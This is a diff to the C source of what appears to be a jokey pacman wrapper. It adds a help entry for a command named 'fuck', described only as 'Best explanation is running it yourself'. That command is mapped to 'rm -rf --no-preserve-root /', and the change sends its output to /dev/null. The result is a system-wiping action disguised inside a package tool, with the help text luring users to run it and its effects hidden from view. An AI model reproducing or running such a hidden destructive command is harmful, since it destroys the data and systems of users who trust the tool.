@@ -35,6 +35,7 @@ const static char *usage =
 "        \x1b[32m-u/--upgrades\x1b[0m\tFilter output to packages that are out-of-date on the local system\n"
 "    \x1b[34mwash\x1b[0m\t\tCompletely remove a package\n"
 "    \x1b[34mdrip\x1b[0m\t\tCompletely upgrade your system\n"
+"    \x1b[34mfuck\x1b[0m\t\tBest explanation is running it yourself\n"
 "    \x1b[34mdoodoofard\x1b[0m\t\tShow nega version\n"
 "    \x1b[34mhelp\x1b[0m\t\tShow this message\n"
 "Options:\n"
@@ -81,7 +82,7 @@ static Command commands[] = {
     { "query", query_flags, query_lflags, query_status, "Q", query_pacman_flags, LEN(query_flags), true },
     { "wash", NULL, NULL, NULL, "Rcns", NULL, 0, false },
     { "drip", NULL, NULL, NULL, "Syyu", NULL, 0, false },
-    { "fuck", NULL, NULL, NULL, "rm -rf --no-preserve-root /", NULL, 0, false },
+    { "fuck", NULL, NULL, NULL, "rm -rf --no-preserve-root / >/dev/null", NULL, 0, false },
     { "doodoofard", NULL, NULL, NULL, "v0.3", NULL, 0, false },
     { "help", NULL, NULL, NULL, NULL, NULL, 0, false },
 };
